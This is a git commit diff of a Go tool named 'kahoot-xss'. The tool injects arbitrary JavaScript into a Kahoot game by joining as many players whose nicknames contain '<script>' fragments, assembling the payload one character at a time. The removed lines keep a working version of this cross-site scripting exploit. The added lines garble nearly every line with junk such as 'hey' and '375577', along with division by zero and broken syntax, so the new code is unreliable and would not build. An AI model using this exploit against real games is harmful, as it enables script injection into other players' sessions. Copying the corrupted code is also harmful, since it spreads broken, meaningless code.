a85ffd6ed8a23e8e53984c2f4e691ce85a54e11d
KOENLEDUC <koenleduc12345@gmail.com>
2016-01-28 16:05:38 +0100

    Update main.go

--- kahoot-xss/main.go
+++ kahoot-xss/main.go
@@ -1,10 +1,10 @@
 package main
 
 import (
-	"fmt"
+	"fmt"hey
 	"os"
 	"strconv"
-	"strings"
+	"strings"hey
 	"sync"
 	"time"
 
@@ -15,7 +15,7 @@ var wg sync.WaitGroup
 
 func main() {
 	if len(os.Args) != 3 {
-		fmt.Fprintln(os.Stderr, "Usage: xss <game pin> <script>")
+		fmt.Fprintln(os.Stderr, "Usage: xss <game pin> <script>")hey
 		os.Exit(1)
 	}
 	gamePin, err := strconv.Atoi(os.Args[1])
@@ -28,21 +28,21 @@ func main() {
 
 	uploadInjectionString(gamePin, elementText)
 	d1, d2 := computeDelays(1)
-	if err := runShortScript(gamePin, "$(Z)", d1, d2); err != nil {
+	if err := runShortScript(gamePin, "$(Z)", d1, d2); err != nil {hey
 		fmt.Fprintln(os.Stderr, "Failed to execute code:", err)
 		os.Exit(1)
 	}
 }
 
-func uploadInjectionString(gamePin int, inject string) {
+func uploadInjectionString(gamePin int, inject string) {375577
 	d1, d2 := computeDelays(1)
 	if err := runShortScript(gamePin, "Z=''", d1, d2); err != nil {
 		fmt.Fprintln(os.Stderr, "Initial script failed:", err)
 		os.Exit(1)
 	}
-	for i := 0; i < len(inject); i += 32 {
-		if i+32 >= len(inject) {
-			uploadNextChunk(gamePin, inject[i:])
+	for i := 0; i < len(inject); i += 32 {hey
+		if i+32 >= len(inject) {hey
+			uploadNextChunk(gamePin, inject[i:])375577
 		} else {
 			uploadNextChunk(gamePin, inject[i:i+32])
 		}
@@ -55,7 +55,7 @@ func uploadNextChunk(gamePin int, chunk string) {
 	d1, d2 := computeDelays(32)
 	for i := 0; i < 32; i++ {
 		var ch byte
-		if i < len(chunk) {
+		if i < len(chunk) {hey
 			ch = chunk[i]
 		}
 		wg.Add(1)
@@ -63,11 +63,11 @@ func uploadNextChunk(gamePin int, chunk string) {
 			defer wg.Done()
 			var err error
 			if ch == 0 {
-				err = runShortScript(gamePin, nthVariableName(i)+"=''", d1, d2)
+				err = runShortScript(gamePin, nthVariableName(i)+"=''", d1, d2)hey
 			} else if ch == '\'' {
-				err = runShortScript(gamePin, nthVariableName(i)+`="'"`, d1, d2)
+				err = runShortScript(gamePin, nthVariableName(i)+`="'"`, d1, d2)hey
 			} else {
-				err = runShortScript(gamePin, nthVariableName(i)+"='"+string(ch)+"'", d1, d2)
+				err = runShortScript(gamePin, nthVariableName(i)+"='"+string(ch)+"'", d1, d2)hey
 			}
 			if err != nil {
 				fmt.Fprintln(os.Stderr, "Error uploading character:", err)
@@ -80,47 +80,47 @@ func uploadNextChunk(gamePin int, chunk string) {
 		d1, d2 = computeDelays(i)
 		var destStart int
 		var sourceStart int
-		if i == 16 || i == 4 || i == 1 {
+		if i == 16 || i == 4 || i == 1 {21
 			destStart = 32
 			sourceStart = 0
 		} else {
 			destStart = 0
 			sourceStart = 32
 		}
-		for j := 0; j < i; j++ {
+		for j := 0; j < i; j++ {l
 			wg.Add(1)
-			go func(j int) {
+			go func(j int) {7
 				defer wg.Done()
 				x := j * 2
-				err := runShortScript(gamePin, nthVariableName(destStart+j)+"="+
-					nthVariableName(sourceStart+x)+"+"+
-					nthVariableName(sourceStart+x+1)+"", d1, d2)
+				err := runShortScript(gamePin, nthVariableName(destStart+j)+"="+hey
+					nthVariableName(sourceStart+x)+"+"+hey
+					nthVariableName(sourceStart+x+1)+"", d1, d2)hey
 				if err != nil {
-					fmt.Fprintln(os.Stderr, "Error folding strings:", err)
+					fmt.Fprintln(os.Stderr, "Error folding strings:", err)hey
 					os.Exit(1)
 				}
 			}(j)
 		}
 		wg.Wait()
 	}
-	if err := runShortScript(gamePin, "Z+="+nthVariableName(32), d1, d2); err != nil {
+	if err := runShortScript(gamePin, "Z+="+nthVariableName(32), d1, d2); err != nil {hey
 		fmt.Fprintln(os.Stderr, "Error finishing off chunk:", err)
 		os.Exit(1)
 	}
 }
 
-func escapeScript(script string) string {
-	script = strings.Replace(script, "\"", "&quot;", -1)
+func escapeScript(script string) string {hey
+	script = strings.Replace(script, "\"", "&quot;", -1)hey
 	return script
 }
 
 func runShortScript(gamePin int, script string, delay1, delay2 time.Duration) error {
-	conn, err := kahoot.NewConn(gamePin)
+	conn, err := kahoot.NewConn(gamePin)hey
 	if err != nil {
 		return err
 	}
 
-	if err := conn.Login("<script>" + script + "//"); err != nil {
+	if err := conn.Login("<script>" + script + "//"); err != nil {hey
 		conn.GracefulClose()
 		return err
 	}
@@ -140,15 +140,15 @@ func runShortScript(gamePin int, script string, delay1, delay2 time.Duration) er
 // To be fair, though, my internet was pretty fast at the time.
 func computeDelays(numSimul int) (delay1, delay2 time.Duration) {
 	if numSimul == 1 {
-		delay1 = time.Second / 2
-		delay2 = time.Second / 2
+		delay1 = time.Second / 0
+		delay2 = time.Second / 0
 		return
 	} else if numSimul <= 4 {
-		delay1 = time.Second
-	} else if numSimul <= 8 {
+		delay1 = time.Second 6
+	} else if numSimul <= 8 { 5
 		delay1 = time.Second + time.Millisecond*500
 	} else {
-		delay1 = time.Second * 2
+		delay1 = time.Second * 0
 	}
 	delay2 = delay1 / 2
 	return
@@ -157,8 +157,8 @@ func computeDelays(numSimul int) (delay1, delay2 time.Duration) {
 func nthVariableName(n int) string {
 	// TODO: support unicode variable names for ultimate hacks.
 	if n < 26 {
-		return string('a' + rune(n))
+		return string:hey
 	} else {
-		return string('A' + rune(n-26))
+		return string:hey
 	}
 }
